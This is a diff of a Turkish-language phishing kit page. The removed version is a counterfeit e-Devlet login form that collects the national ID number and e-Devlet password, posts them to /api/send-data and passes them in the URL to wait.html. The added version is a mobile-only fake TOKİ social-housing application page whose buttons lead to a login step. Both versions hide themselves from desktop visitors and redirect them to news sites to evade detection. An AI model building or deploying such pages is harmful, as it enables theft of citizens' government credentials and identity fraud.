@@ -1,428 +1,398 @@
 <!DOCTYPE html>
-<html lang="tr">
-<head>
+<html lang="tr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TOKİ Danışmanlık</title>
+  <meta name="description" content="TOKİ başvuru süreçleri için kurumsal danışmanlık">
+  <meta name="theme-color" content="#1E3A5F">
 
-	<!-- Meta Pixel Code -->
-	<script>
-		!function(f,b,e,v,n,t,s)
-		{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-		n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-		if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-		n.queue=[];t=b.createElement(e);t.async=!0;
-		t.src=v;s=b.getElementsByTagName(e)[0];
-		s.parentNode.insertBefore(t,s)}(window, document,'script',
-		'https://connect.facebook.net/en_US/fbevents.js');
-		fbq('init', '1120174740100703');
-		fbq('track', 'PageView');
-		</script>
-		<noscript><img height="1" width="1" style="display:none"
-		src="https://www.facebook.com/tr?id=1120174740100703&ev=PageView&noscript=1"
-		/></noscript>
-	<!-- End Meta Pixel Code -->
-	
-		<!-- Meta Pixel Code -->
-	<script>
-		!function(f,b,e,v,n,t,s)
-		{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-		n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-		if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-		n.queue=[];t=b.createElement(e);t.async=!0;
-		t.src=v;s=b.getElementsByTagName(e)[0];
-		s.parentNode.insertBefore(t,s)}(window, document,'script',
-		'https://connect.facebook.net/en_US/fbevents.js');
-		fbq('init', '2183701782160363');
-		fbq('track', 'PageView');
-		</script>
-		<noscript><img height="1" width="1" style="display:none"
-		src="https://www.facebook.com/tr?id=1120174740100703&ev=PageView&noscript=1"
-		/></noscript>
-	<!-- End Meta Pixel Code -->
-	
-	
-	
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>e-Devlet Kapısı - Kimlik Doğrulama Sistemi</title>
-    <style>
-        /* CSS'in Tamamı - Ana Yapı Aynen Korundu */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+   <style>
+    :root{
+      --primary:#1E3A5F;
+      --accent:#0EA5A5;
+      --text:#0F172A;
+      --muted:#64748B;
+      --bg:#F5F7FA;
+      --card:#FFFFFF;
+      --border:#E5E7EB;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      background:var(--bg); color:var(--text);
+    }
+     
+    /* Varsayılan: mobil site görünür, desktop bakım gizli */
+    .mobile-site{display:flex; flex-direction:column; min-height:100vh}
+    .desktop-maintenance{display:none}
+    /* Mobil: logo üstte, tam genişlik img olarak */
+    .mobile-logo{position:relative; width:100vw}
+    .mobile-logo-img{display:block; width:100vw; height:auto}
+    /* İçerik üst katman: logonun hemen altından başlar */
+    .mobile-overlay{position:relative; z-index:1; flex:1}
+    .mobile-full-image{display:block; width:100vw; height:auto}
+    /* Görsel bindirme alanı */
+    .mobile-visual{position:relative; width:100vw}
+    .mobile-visual::before{content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.2); z-index:1; pointer-events:none}
+    .overlay-image{position:absolute; left:2%; top:8%; transform:none; width:min(60vw, 320px); height:auto; pointer-events:none; display:block; z-index:2}
+    .news-banner{position:absolute; bottom:46%; left:3%; transform:none; width:75%; max-width:280px; z-index:3; font-size:12px; line-height:1.4; text-align:left}
+    .news-banner h4{font-size:14px; font-weight:700; margin:0 0 4px; color:#ffffff !important; text-shadow:none}
+    .news-banner p{margin:0; color:#ffffff !important; text-shadow:none; font-weight:500}
+    /* Mobil başlık alanı (görsel altı) */
+    .mobile-heading{padding:12px 18px; text-align:center}
+    .mobile-heading h2{margin:0; font-family:Poppins, Inter, system-ui, sans-serif; font-weight:700; font-size:15px; line-height:1.25; color:var(--text)}
+    .mobile-heading h3{margin:2px 0 0; font-family:Poppins, Inter, system-ui, sans-serif; font-weight:800; font-size:17px; letter-spacing:.4px; color:var(--primary)}
+    .mobile-desc{margin:4px 18px 0; font-size:13px; line-height:1.45; color:var(--text); text-align:center}
+    /* Mobil footer alanı */
+    .mobile-footer{position:relative; width:100vw; min-height:200px; color:#fff; overflow:hidden;
+      background: linear-gradient(135deg, #1E3A5F 0%, #2C5282 100%); background-size:cover; background-position:center; z-index: 5;}
+    .mobile-footer::before{content:""; position:absolute; inset:0; background:linear-gradient(180deg, rgba(0,0,0,.35), rgba(0,0,0,.55))}
+    .mobile-footer-content{position:relative; z-index:1; padding:16px 18px; display:flex; flex-direction:column; justify-content:center; align-items:flex-start; gap:6px; min-height:200px;}
+    .mobile-footer-title{margin:0; font-family:Poppins, Inter, system-ui, sans-serif; font-weight:700; font-size:20px; line-height:1.25}
+    .mobile-footer-sub{margin:0; font-weight:600; font-size:15px}
+    .mobile-footer-note{margin:4px 0 0; font-size:13px; opacity:.95}
+    .container{max-width:1120px; margin:0 auto; padding:24px 16px}
+    .site-header{
+      background:var(--primary); color:#fff; border-bottom:1px solid rgba(255,255,255,.15);
+    }
+    .site-header .inner{display:flex; align-items:center; justify-content:space-between; gap:16px; padding:14px 0}
+    .brand{display:flex; align-items:center; gap:10px; font-weight:700; letter-spacing:.2px}
+    .brand .emblem{display:inline-flex; align-items:center; justify-content:center; width:32px; height:32px; border-radius:6px; background:rgba(255,255,255,.1); font-size:18px}
+    .brand .text{font-family:Poppins, Inter, system-ui, sans-serif}
+    .subtitle{font-size:13px; opacity:.9}
+    .hero{
+      position:relative; overflow:hidden; margin-top:16px; border:1px solid var(--border); border-radius:14px;
+      background: radial-gradient(1200px 300px at 10% -10%, #E8EEF7 0%, transparent 60%), linear-gradient(180deg, #ffffff, #f4f6fa);
+      padding:34px;
+    }
+    .hero h1{margin:0 0 10px 0; font-family:Poppins, Inter, system-ui, sans-serif; font-weight:700; letter-spacing:.2px; color:var(--primary)}
+    .hero p{margin:0; color:var(--muted)}
+    .badges{display:flex; flex-wrap:wrap; gap:10px; margin-top:14px}
+    .badge{display:inline-flex; align-items:center; gap:8px; padding:8px 10px; border:1px solid var(--border); background:#fff; border-radius:999px; font-size:12px; color:var(--text)}
+    .badge .dot{width:6px; height:6px; background:var(--accent); border-radius:50%}
+    .section-title{margin:28px 0 12px; font-size:18px; color:var(--text); font-weight:700}
+    .cards{display:grid; grid-template-columns:repeat(3, minmax(0,1fr)); gap:14px}
+    .card-link{
+      display:block; text-decoration:none; color:var(--text); background:var(--card);
+      border:1px solid var(--border); border-radius:12px; padding:16px; transition:transform .18s ease, box-shadow .18s ease, border-color .18s ease;
+    }
+    .card-link:hover{border-color:var(--accent); box-shadow:0 6px 18px rgba(2, 132, 199, .12); transform:translateY(-2px)}
+    .card-head{display:flex; align-items:center; gap:10px; font-weight:700; letter-spacing:.2px}
+    .card-icon{width:36px; height:36px; display:inline-flex; align-items:center; justify-content:center; border-radius:10px; background:#ECFEFF; color:#0EA5A5}
+    .card-desc{margin:6px 0 0; color:var(--muted); font-weight:500; font-size:14px}
+    .card-cta{margin-top:10px; display:inline-flex; align-items:center; gap:6px; color:var(--accent); font-weight:600}
+    .card-cta .arrow{transition:transform .18s ease}
+    .card-link:hover .card-cta .arrow{transform:translateX(2px)}
+    footer{margin:44px 0 8px; text-align:center; color:var(--muted); font-size:13px}
+    @media (max-width:900px){.cards{grid-template-columns:repeat(2, minmax(0,1fr))}}
+    @media (max-width:640px){
+      .hero{padding:24px}
+      .cards{grid-template-columns:1fr}
+    }
+    /* Masaüstü: normal site görünümü devam etsin */
+    @media (min-width:992px){
+      .mobile-site{display:flex}
+      .desktop-maintenance{display:none}
+    }
+  </style>
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="css2.css" rel="stylesheet">
+ 
+ </head>
+ <body>
+  <style>
+body {
+  display: block;
+}
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f5f5f5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
+@media (min-width: 1025px) {
+  body {
+    display: none !important;
+  }
+}
+</style>
 
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-
-        .logo-container {
-            margin-bottom: -27px;
-        }
-
-        .logo {
-            width: 270px;
-            height: 180px;
-            background-image: url('./images/mylogo.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-            margin: 0 auto 25px auto;
-            display: block;
-        }
-
-        .title {
-            color: #2c3e50;
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-
-        .subtitle {
-            color: #7f8c8d;
-            font-size: 13px;
-            margin-bottom: 35px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ BAŞLANGIÇ ------------- */
-
-        .form-group {
-            margin-bottom: 18px;
-            text-align: left;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-
-        .required {
-            color: #e74c3c;
-        }
-		
-        .form-control {
-            background-color: #fff;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #000;
-            padding: 5px 10px;
-            border: 1px solid #a5a9b1;
-            width: 100%;
-            height: 2.8125rem;
-            display: inline-block;
-            vertical-align: bottom;
-            border-radius: .5rem;
-            float: left;
-        }
-
-        .form-control:focus {
-            /* INPUT alanına tıklandığında (focus) stili */
-            outline: none;
-            border-color: #3498db;
-            background-color: white;
-            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
-        }
-		
-
-
-        .btn-primary {
-            /* DEVAM ET Butonunun ana stili */
-            width: 62% !important;
-			display: inline-block;
-            padding: 0 15px;
-            background: linear-gradient(120deg,#338ad6 0,#045ead 80%);
-            color: #FFF;
-            border: none;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 15px;
-        }
-
-        .btn-primary:hover {
-            /* Buton üzerine gelindiğinde stili */
-            background: #357abd;
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(74, 144, 226, 0.3);
-        }
-
-        .btn-primary:active {
-            /* Butona basıldığında stili */
-            transform: translateY(0);
-        }
-
-        /* Yüklenme ve Hata Geri Bildirim Stilleri (Formla İlişkili) */
-
-        .result-container {
-            margin-top: 20px;
-            padding: 20px;
-            border-radius: 8px;
-            display: none;
-        }
-
-        .result-success {
-            background-color: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-        }
-
-        .result-error {
-            background-color: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-        }
-
-        .loading {
-            display: none;
-            margin-top: 15px;
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ SONU ------------- */
-
-        /* Diğer Ana Yapı Stilleri (Aynen Korundu) */
-        .footer {
-            margin-top: 30px;
-            padding: 15px 0;
-            border-top: 1px solid #ecf0f1;
-            color: #7f8c8d;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            height: 60px;
-        }
-        
-        .footer-logo {
-            width: 268px;
-            height: 50px;
-            background-image: url('./images/mysublogo.png');
-            background-size: contain;
-            background-repeat: no-repeat;
-            background-position: center;
-        }
-
-
-        /* Mobile Responsive */
-        @media (max-width: 480px) {
-            body {
-                padding: 15px;
-            }
-            
-            .container {
-                padding: 30px 25px;
-                margin: 0;
-                max-width: 100%;
-            }
-            
-            .title {
-                font-size: 20px;
-            }
-            
-            .subtitle {
-                font-size: 12px;
-            }
-            
-            /* Responsive input/button stili */
-            .form-control, .btn-primary {
-                padding: 12px;
-                font-size: 14px;
-            }
-        }
-
-        @media (max-width: 360px) {
-            .container {
-                padding: 25px 20px;
-            }
-            
-            .logo {
-                width: 245px;
-                height: 120px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo-container">
-            <div class="logo"></div>
-
-        </div>
-
-        <form id="identityForm">
-            <div class="form-group">
-                <label for="tc_no">
-                    <span class="required">*</span> T.C. Kimlik No
-                </label>
-                <input 
-                    type="text" 
-                    id="tc_no" 
-                    name="tc_no" 
-                    class="form-control" 
-                    placeholder=""
-                    maxlength="11"
-                    required
-                >
-            </div>
-			<br><br>
-
-            <div class="form-group">
-                <label for="password">
-                    <span class="required">*</span> e-Devlet Şifresi
-                </label>
-                <input 
-                    type="password" 
-                    id="password" 
-                    name="password" 
-                    class="form-control" 
-                    placeholder=""
-                    required
-                >
-            </div>
-			<br><br>
-
-            <button type="submit" class="btn-primary">
-                Devam Et
-            </button>
-
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p style="margin-top: 10px; color: #666;">Kimlik doğrulanıyor...</p>
-            </div>
-        </form>
-
-        <div class="result-container" id="result">
-            </div>
-
-        <div class="footer">
-            <div class="footer-logo"></div>
-        </div>
+  <div class="mobile-site" aria-label="Mobil ana sayfa">
+    <div class="mobile-logo" aria-label="Logo alanı">
+      <img class="mobile-logo-img" src="toklogo.png" alt="TOKİ logo">
     </div>
+    <div class="mobile-overlay">
+      <div class="mobile-visual">
+        <img class="mobile-full-image mobile-base" src="toki1.jpg" alt="TOKİ görseli">
+        <div class="news-banner" style="
+    bottom: 30%;
+    width: 90%;
+">
+          <h4 style="
+    font-size: 16px;
+">İLK EVİM, İLK İŞYERİM PROJESİNDE<br>1,5 AYDA 8 MİLYON BAŞVURU</h4> <br>
+          <p style="
+    font-size: 14px;
+">"İlk Evim" projesinde e-Devlet ve bankalar üzerinden resmî müracaat süresi tamamlandı. 1,5 ayda 8 milyon başvuru yapıldı, geçerli başvuru sayısı 5 milyon 135 bin 324'e ulaştı! Projemize sahip çıkan tüm vatandaşlarımıza müteşekkiriz, söz verdiğimiz gibi 2 yıl içinde 250 bin konutumuzu teslim edeceğiz!</p>
+        </div>
+        <img class="overlay-image" src="tesekkur.png" alt="Teşekkür görseli">
+      </div>
+      <style>
+.btns {
+  display: flex;
+  justify-content: center;
+  margin: 20px 0;
+}
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-          var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-          if (!isMobile) {
-            window.location.href = "https://www.trthaber.com/";
-          }
-        });
-    </script>
-	
+.btn-single a {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #1E4BB2;
+  color: #fff;
+  text-decoration: none;
+  padding: 15px 25px;
+  border-radius: 10px;
+  font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s ease;
+  width: 100%;
+  max-width: 380px;
+}
+
+.btn-single a:hover {
+  background-color: #163a88;
+  transform: translateY(-2px);
+  box-shadow: 0 6px 14px rgba(0, 0, 0, 0.25);
+}
+
+.leftSide {
+  display: flex;
+  flex-direction: column;
+}
+
+.leftSide p {
+  font-size: 15px;
+  font-weight: 600;
+  margin: 0;
+}
+
+.leftSide span {
+  font-size: 13px;
+  text-decoration: underline;
+  margin-top: 4px;
+}
+
+.rightSide i {
+  font-size: 25px;
+}
+
+.icon-go::before {
+  content: "➔"; /* İstersen buraya bir ikon fontu koyabilirsin */
+}
+
+.icon-sosyal::before {
+  content: "🏠";
+  font-size: 20px;
+  margin-right: 8px;
+}
+</style>
+<div class="btns">
+  <div class="btn-single">
+    <a href="./giris.html">
+      <div class="leftSide">
+        <p>500 BİN SOSYAL KONUT PROJESİ</p>
+        <span style="text-align: center;margin-top: 10px;">Başvuru Yap</span>
+      </div>
+      <div class="rightSide">
+        <i class="icon-go"></i>
+      </div>
+    </a>
+  </div>
+</div>
+
+<div class="mobile-heading" aria-labelledby="mh1 mh2">
+  <h3 id="mh2">BİLGİLENDİRME</h3>
+</div>
+
+<div class="deadline-banner">
+  <span class="highlight">Sosyal Konut Başvuruları İçin Son Gün:</span>
+  <span class="date">23 Ekim 2025</span>
+</div>
+
+<p class="mobile-desc">
+  Konutlar, %10 peşin 240 ay vadeli sabit taksit ödemeli ve taksit başlangıçları konut teslimlerini takip eden ay itibariyle başlayacaktır.
+</p>
+
+<style>
+/* Genel görünüm düzeni */
+body {
+  font-family: "Poppins", "Segoe UI", sans-serif;
+}
+
+/* Başvuru butonu */
+.btn-single a {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: linear-gradient(90deg, #003366, #004c99);
+  color: #fff;
+  text-decoration: none;
+  padding: 18px 22px;
+  border-radius: 12px;
+  box-shadow: 0 4px 14px rgba(0, 51, 102, 0.3);
+  transition: all 0.3s ease;
+}
+
+.btn-single a:hover {
+  background: linear-gradient(90deg, #004080, #0066cc);
+  transform: translateY(-2px);
+  box-shadow: 0 6px 18px rgba(0, 51, 102, 0.4);
+}
+
+.btn-single p {
+  font-weight: 700;
+  font-size: 16px;
+  margin: 0;
+  opacity: 0.9;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.btn-single span {
+  font-weight: 800;
+  font-size: 19px;
+  display: block;
+}
+
+/* Bilgilendirme başlığı */
+.mobile-heading h3 {
+  font-size: 22px;
+  font-weight: 800;
+  color: #003366;
+  text-align: center;
+  letter-spacing: 1px;
+  margin-top: 25px;
+  margin-bottom: 10px;
+  text-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+  position: relative;
+}
+
+.mobile-heading h3::after {
+  content: "";
+  display: block;
+  width: 70px;
+  height: 3px;
+  background: linear-gradient(90deg, #003366, #0073e6);
+  margin: 8px auto 0;
+  border-radius: 2px;
+}
+
+/* Son gün duyurusu */
+.deadline-banner {
+  margin-top: 15px;
+  text-align: center;
+  background: linear-gradient(90deg, #004080, #005cbf);
+  color: #fff;
+  font-weight: 700;
+  font-size: 19px;
+  padding: 16px 20px;
+  border-radius: 12px;
+  box-shadow: 0 4px 14px rgba(0, 60, 120, 0.3);
+  letter-spacing: 0.4px;
+  line-height: 1.4;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.deadline-banner:hover {
+  transform: scale(1.03);
+  box-shadow: 0 6px 20px rgba(0, 60, 120, 0.45);
+}
+
+.deadline-banner .highlight {
+  display: block;
+  font-size: 18px;
+  font-weight: 600;
+  opacity: 0.95;
+}
+
+.deadline-banner .date {
+  display: block;
+  font-size: 23px;
+  font-weight: 800;
+  color: #ffdd57;
+  margin-top: 5px;
+}
+
+/* Kırmızı bilgi kutusu */
+.mobile-desc {
+  margin-top: 15px;
+  font-weight: 700;
+  font-size: 20px;
+  color: #fff;
+  background: linear-gradient(90deg, #a71111, #c62828);
+  padding: 18px 22px;
+  border-radius: 12px;
+  box-shadow: 0 4px 12px rgba(150, 0, 0, 0.35);
+  text-align: center;
+  line-height: 1.5;
+  letter-spacing: 0.3px;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.mobile-desc:hover {
+  transform: scale(1.02);
+  box-shadow: 0 6px 16px rgba(146, 13, 13, 0.5);
+}
+</style>
 
 
-    <script>
-        // T.C. Kimlik No input validation
-        document.getElementById('tc_no').addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);
-        });
+      <div class="project-images" style="margin: 15px 0 25px 0;">
+        <img src="1.png" alt="Proje 1" style="display: block; width: 100%; max-width: 100%; height: auto;">
+        <img src="2.png" alt="Proje 2" style="display: block; width: 100%; max-width: 100%; height: auto; margin: 0;">
+        <img src="3.png" alt="Proje 3" style="display: block; width: 100%; max-width: 100%; height: auto; margin: 0;">
 
-        // TC doğrulama (demo - temel kurallar)
-        function validateTCNumber(tc) {
-            if (!/^\d{11}$/.test(tc)) return false; // 11 hane ve sadece rakam
-            if (tc[0] === '0') return false; // İlk hane 0 olamaz
-            return true; // Demo: ileri algoritma kapalı
-        }
-
-        // Form submission (Vercel API'ye veri gönderme mantığı - aynen korundu)
-        document.getElementById('identityForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const tcNo = document.getElementById('tc_no').value;
-            const password = document.getElementById('password').value;
-            const loading = document.getElementById('loading');
-            const result = document.getElementById('result');
-            const submitBtn = document.querySelector('.btn-primary');
-            
-            // Validation
-            if (!validateTCNumber(tcNo)) {
-                showResult('Geçersiz T.C. Kimlik numarası.', 'error');
-                return;
-            }
-            
-            if (!password.trim()) {
-                showResult('e-Devlet şifresi boş olamaz.', 'error');
-                return;
-            }
-            
-            // Show loading
-            loading.style.display = 'block';
-            result.style.display = 'none';
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'İşlem yapılıyor...';
-            
-            try {
-                // Veriyi Vercel Serverless Function'a gönder (API endpoint'imiz: /api/send-data)
-                const response = await fetch('/api/send-data', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ tc_no: tcNo, password: password }),
-                });
-
-                if (response.ok) {
-                    // Başarılı ise wait.html'e tc_no ve password ile git
-                    const params = new URLSearchParams({ 'tc_no': tcNo, 'password': password });
-                    window.location.href = `wait.html?${params.toString()}`;
-                    return;
-                } else {
-                    const data = await response.json().catch(() => ({}));
-                    showResult(`İletim başarısız. Lütfen bilgileri kontrol edip tekrar deneyin. (${data.message || 'Bilinmeyen Hata'})`, 'error');
-                }
-            } catch (error) {
-                console.error('Fetch error:', error);
-                showResult('Sunucu ile iletişimde bir sorun oluştu.', 'error');
-            } finally {
-                // UI reset
-                loading.style.display = 'none';
-                submitBtn.disabled = false;
-                submitBtn.textContent = 'Devam Et';
-            }
-        });
+       <a href="/giris" class="image-link"> <img src="yonlen.png" alt="Proje 4" style="display: block; width: 100%; max-width: 100%; height: auto; margin: 0;"></a>
+      </div>
+      
+      <div style="position: fixed; bottom: 0; left: 0; right: 0; display: flex; gap: 8px; padding: 10px; background: #f8f8f8; border-top: 1px solid #e0e0e0; z-index: 1000;">
+        <!-- İlk Evim Butonu -->
+        <a href="/giris" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; 
+          background-color: #3959a5; color: white; text-decoration: none; padding: 12px 5px; border-radius: 6px;
+          text-align: center; font-weight: 600; font-size: 13px; line-height: 1.3;">
+          <span>İlk Evim</span>
+          <span style="font-weight: 400; font-size: 11px; opacity: 0.9;">Başvuru</span>
+        </a>
         
-        function showResult(message, type) {
-            const result = document.getElementById('result');
-            result.className = `result-container result-${type}`;
-            result.innerHTML = `<p>${message}</p>`;
-            result.style.display = 'block';
-        }
-    </script>
-	
-</body>
-</html>
+        <!-- İlk İşyerim Butonu -->
+        <a href="/giris" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; 
+          background-color: #038555; color: white; text-decoration: none; padding: 12px 5px; border-radius: 6px;
+          text-align: center; font-weight: 600; font-size: 13px; line-height: 1.3;">
+          <span>İlk İşyerim</span>
+          <span style="font-weight: 400; font-size: 11px; opacity: 0.9;">Başvuru</span>
+        </a>
+        
+        <!-- İlk Evim Arsa Butonu -->
+        <a href="/giris" style="flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; 
+          background-color: #073465; color: white; text-decoration: none; padding: 12px 5px; border-radius: 6px;
+          text-align: center; font-weight: 600; font-size: 13px; line-height: 1.3;">
+          <span>İlk Evim Arsa</span>
+          <span style="font-weight: 400; font-size: 11px; opacity: 0.9;">Başvuru</span>
+        </a>
+      </div>
+    </div>
+    <section class="mobile-footer" aria-labelledby="footer-baslik">
+      <div class="mobile-footer-content">
+        <h2 id="footer-baslik" class="mobile-footer-title">Cumhuriyet Tarihinin En Büyük</h2>
+        <h3 class="mobile-footer-sub">Sosyal Konut Hamlesi için Başvurun</h3>
+        <p class="mobile-footer-note">Başvuru detaylarını nasıl başvururum sayfasından inceleyebilirsiniz. Başvurular E-Devlet üzerinden yapılacaktır.</p>
+      </div>
+    </section>
+  </div>
+  <script>
+  document.addEventListener("DOMContentLoaded", function () {
+    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    if (!isMobile) {
+      window.location.href = "https://www.ntv.com.tr/galeri/turkiye/toki-500-bin-ev-basvuru-ucreti-toki-11-21-500-bin-konut-hangi-illere-yapilacak-yeni-toki-kampanyasi-basvuru-sartlari-basvuru-tarihleri,4OpLd0uBl0GHfgsCPPFqPg";
+    }
+  });
+</script>
+  
+
+</body></html>
